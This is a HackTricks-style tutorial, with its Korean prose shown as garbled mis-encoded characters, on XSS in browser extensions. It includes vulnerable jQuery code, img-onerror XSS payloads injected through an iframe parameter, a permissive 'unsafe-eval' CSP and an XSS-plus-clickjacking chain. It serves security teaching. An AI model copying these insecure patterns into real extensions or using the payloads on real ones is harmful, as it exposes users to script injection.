# BrowExt - XSS ì˜ˆì œ

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ì›Œë³´ì„¸ìš”<strong>!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì›¨ê·¸**](https://peass.creator-spring.com)ë¥¼ ì–»ìœ¼ì„¸ìš”.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”. ë…ì ì ì¸ [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜ì…ë‹ˆë‹¤.
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)ì„ **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **Hacking íŠ¸ë¦­ì„ ê³µìœ í•˜ë ¤ë©´** [**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì„¸ìš”.

</details>

## Iframeì„ í†µí•œ Cross-Site Scripting (XSS)

ì´ ì„¤ì •ì—ì„œëŠ” **ì½˜í…ì¸  ìŠ¤í¬ë¦½íŠ¸**ê°€ êµ¬í˜„ë˜ì–´ Iframeì„ ì¸ìŠ¤í„´ìŠ¤í™”í•˜ê³ , Iframeì˜ ì†ŒìŠ¤ë¡œ ì¿¼ë¦¬ ë§¤ê°œë³€ìˆ˜ë¥¼ í¬í•¨í•œ URLì„ ì‚¬ìš©í•©ë‹ˆë‹¤:
```javascript
chrome.storage.local.get("message", result => {
let constructedURL = chrome.runtime.getURL("message.html") +
"?content=" + encodeURIComponent(result.message) +
"&redirect=https://example.net/details";
frame.src = constructedURL;
});
```
ê³µê°œì ìœ¼ë¡œ ì ‘ê·¼ ê°€ëŠ¥í•œ HTML í˜ì´ì§€ì¸ **`message.html`**ì€ URLì˜ ë§¤ê°œë³€ìˆ˜ì— ë”°ë¼ ë¬¸ì„œ ë³¸ë¬¸ì— ë™ì ìœ¼ë¡œ ì½˜í…ì¸ ë¥¼ ì¶”ê°€í•˜ëŠ” ê²ƒì„ ëª©ì ìœ¼ë¡œ í•©ë‹ˆë‹¤:
```javascript
$(document).ready(() => {
let urlParams = new URLSearchParams(window.location.search);
let userContent = urlParams.get("content");
$(document.body).html(`${userContent} <button id='detailBtn'>Details</button>`);
$('#detailBtn').on('click', () => {
let destinationURL = urlParams.get("redirect");
chrome.tabs.create({ url: destinationURL });
});
});
```
ì•…ì„± ìŠ¤í¬ë¦½íŠ¸ê°€ ì ëŒ€ì ì¸ í˜ì´ì§€ì—ì„œ ì‹¤í–‰ë˜ì–´ Iframeì˜ ì†ŒìŠ¤ì˜ `content` ë§¤ê°œë³€ìˆ˜ë¥¼ ìˆ˜ì •í•˜ì—¬ **XSS í˜ì´ë¡œë“œ**ë¥¼ ì‚½ì…í•©ë‹ˆë‹¤. ì´ëŠ” í•´ë¡œìš´ ìŠ¤í¬ë¦½íŠ¸ë¥¼ í¬í•¨í•˜ëŠ” Iframeì˜ ì†ŒìŠ¤ë¥¼ ì—…ë°ì´íŠ¸í•˜ì—¬ ë‹¬ì„±ë©ë‹ˆë‹¤:
```javascript
setTimeout(() => {
let targetFrame = document.querySelector("iframe").src;
let baseURL = targetFrame.split('?')[0];
let xssPayload = "<img src='invalid' onerror='alert(\"XSS\")'>";
let maliciousURL = `${baseURL}?content=${encodeURIComponent(xssPayload)}`;

document.querySelector("iframe").src = maliciousURL;
}, 1000);
```
ê³¼ë„í•˜ê²Œ í—ˆìš©ì ì¸ Content Security Policy (CSP) ì˜ˆì‹œëŠ” ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤:
```json
"content_security_policy": "script-src 'self' 'unsafe-eval'; object-src 'self';"
```
JavaScriptë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆê²Œ í•´ì„œ ì‹œìŠ¤í…œì´ XSS ê³µê²©ì— ì·¨ì•½í•´ì§€ë„ë¡ í•©ë‹ˆë‹¤.

XSSë¥¼ ìœ ë°œí•˜ê¸° ìœ„í•œ ëŒ€ì•ˆì ì¸ ì ‘ê·¼ ë°©ì‹ì€ Iframe ìš”ì†Œë¥¼ ìƒì„±í•˜ê³  `content` ë§¤ê°œë³€ìˆ˜ë¡œ í•´ë¡œìš´ ìŠ¤í¬ë¦½íŠ¸ë¥¼ í¬í•¨í•œ ì†ŒìŠ¤ë¥¼ ì„¤ì •í•˜ëŠ” ê²ƒì…ë‹ˆë‹¤:
```javascript
let newFrame = document.createElement("iframe");
newFrame.src = "chrome-extension://abcdefghijklmnopabcdefghijklmnop/message.html?content=" +
encodeURIComponent("<img src='x' onerror='alert(\"XSS\")'>");
document.body.append(newFrame);
```
## DOM ê¸°ë°˜ XSS + í´ë¦­ì¬í‚¹

ì´ ì˜ˆì œëŠ” [ì›ë³¸ ê²Œì‹œë¬¼ ì„¤ëª…](https://thehackerblog.com/steam-fire-and-paste-a-story-of-uxss-via-dom-xss-clickjacking-in-steam-inventory-helper/)ì—ì„œ ê°€ì ¸ì™”ìŠµë‹ˆë‹¤.

í•µì‹¬ ë¬¸ì œëŠ” **`/html/bookmarks.html`**ì— ìœ„ì¹˜í•œ DOM ê¸°ë°˜ í¬ë¡œìŠ¤ ì‚¬ì´íŠ¸ ìŠ¤í¬ë¦½íŒ…(XSS) ì·¨ì•½ì ì—ì„œ ë°œìƒí•©ë‹ˆë‹¤. ë¬¸ì œê°€ ë˜ëŠ” JavaScriptëŠ” **`bookmarks.js`**ì˜ ì¼ë¶€ë¡œ ì•„ë˜ì— ìì„¸íˆ ì„¤ëª…ë˜ì–´ ìˆìŠµë‹ˆë‹¤.
```javascript
$('#btAdd').on('click', function() {
var bookmarkName = $('#txtName').val();
if ($('.custom-button .label').filter(function() {
return $(this).text() === bookmarkName;
}).length) return false;

var bookmarkItem = $('<div class="custom-button">');
bookmarkItem.html('<span class="label">' + bookmarkName + '</span>');
bookmarkItem.append('<button class="remove-btn" title="delete">x</button>');
bookmarkItem.attr('data-title', bookmarkName);
bookmarkItem.data('timestamp', (new Date().getTime()));
$('section.bookmark-container .existing-items').append(bookmarkItem);
persistData();
});
```
ì´ ì½”ë“œ ì¡°ê°ì€ **`txtName`** ì…ë ¥ í•„ë“œì—ì„œ **`value`**ë¥¼ ê°€ì ¸ì˜¤ê³ , **ë¬¸ìì—´ ì—°ê²°ì„ ì‚¬ìš©í•˜ì—¬ HTMLì„ ìƒì„±**í•œ ë‹¤ìŒ jQueryì˜ `.append()` í•¨ìˆ˜ë¥¼ ì‚¬ìš©í•˜ì—¬ DOMì— ì¶”ê°€í•©ë‹ˆë‹¤.

ì¼ë°˜ì ìœ¼ë¡œ Chrome í™•ì¥ í”„ë¡œê·¸ë¨ì˜ ì½˜í…ì¸  ë³´ì•ˆ ì •ì±… (CSP)ì€ ì´ëŸ¬í•œ ì·¨ì•½ì ì„ ë°©ì§€í•©ë‹ˆë‹¤. ê·¸ëŸ¬ë‚˜ **'unsafe-eval'ë¡œ CSP ì™„í™”** ë° jQueryì˜ DOM ì¡°ì‘ ë©”ì„œë“œ (DOM ì‚½ì… ì‹œ [`eval()`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval)ì— ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì „ë‹¬í•˜ê¸° ìœ„í•´ [`globalEval()`](https://api.jquery.com/jquery.globaleval/)ì„ ì‚¬ìš©) ì‚¬ìš©ìœ¼ë¡œ ì¸í•´ ì—¬ì „íˆ ì•…ìš©ì´ ê°€ëŠ¥í•©ë‹ˆë‹¤.

ì´ ì·¨ì•½ì ì€ ì¤‘ìš”í•˜ì§€ë§Œ, ì•…ìš©ì€ ì¼ë°˜ì ìœ¼ë¡œ ì‚¬ìš©ì ìƒí˜¸ ì‘ìš©ì— ì˜ì¡´í•©ë‹ˆë‹¤: í˜ì´ì§€ ë°©ë¬¸, XSS í˜ì´ë¡œë“œ ì…ë ¥ ë° "Add" ë²„íŠ¼ í™œì„±í™”.

ì´ ì·¨ì•½ì ì„ ê°•í™”í•˜ê¸° ìœ„í•´ ë³´ì¡° **í´ë¦­ì¬í‚¹** ì·¨ì•½ì ì´ ì•…ìš©ë©ë‹ˆë‹¤. Chrome í™•ì¥ í”„ë¡œê·¸ë¨ì˜ ë§¤ë‹ˆí˜ìŠ¤íŠ¸ì—ëŠ” `web_accessible_resources` ì •ì±…ì´ ìƒì„¸íˆ í‘œì‹œë©ë‹ˆë‹¤:
```json
"web_accessible_resources": [
"html/bookmarks.html",
"dist/*",
"assets/*",
"font/*",
[...]
],
```
íŠ¹íˆ **`/html/bookmarks.html`** í˜ì´ì§€ëŠ” í”„ë ˆì´ë°ì— ì·¨ì•½í•˜ì—¬ **í´ë¦­ì¬í‚¹**ì— ì·¨ì•½í•©ë‹ˆë‹¤. ì´ ì·¨ì•½ì ì€ ê³µê²©ìì˜ ì‚¬ì´íŠ¸ ë‚´ì—ì„œ í˜ì´ì§€ë¥¼ í”„ë ˆì„ìœ¼ë¡œ ë¬¶ì–´ ì¸í„°í˜ì´ìŠ¤ë¥¼ ì†ì´ëŠ” DOM ìš”ì†Œë¥¼ ì˜¤ë²„ë ˆì´í•˜ì—¬ ì¬ì„¤ê³„í•©ë‹ˆë‹¤. ì´ ì¡°ì‘ìœ¼ë¡œ ì¸í•´ í”¼í•´ìë“¤ì€ ì˜ë„ì¹˜ ì•Šê²Œ ê¸°ë°˜ í™•ì¥ í”„ë¡œê·¸ë¨ê³¼ ìƒí˜¸ì‘ìš©í•˜ê²Œ ë©ë‹ˆë‹¤.

## ì°¸ê³  ìë£Œ

* [https://palant.info/2022/08/31/when-extension-pages-are-web-accessible/](https://palant.info/2022/08/31/when-extension-pages-are-web-accessible/)
* [https://thehackerblog.com/steam-fire-and-paste-a-story-of-uxss-via-dom-xss-clickjacking-in-steam-inventory-helper/](https://thehackerblog.com/steam-fire-and-paste-a-story-of-uxss-via-dom-xss-clickjacking-in-steam-inventory-helper/)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ì›Œë³´ì„¸ìš”<strong>!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì›¨ê·¸**](https://peass.creator-spring.com)ë¥¼ ì–»ìœ¼ì„¸ìš”.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”. ë…ì ì ì¸ [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜ì…ë‹ˆë‹¤.
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**ë¥¼** **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **Hacking íŠ¸ë¦­ì„ ê³µìœ í•˜ë ¤ë©´** [**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì„¸ìš”.

</details>
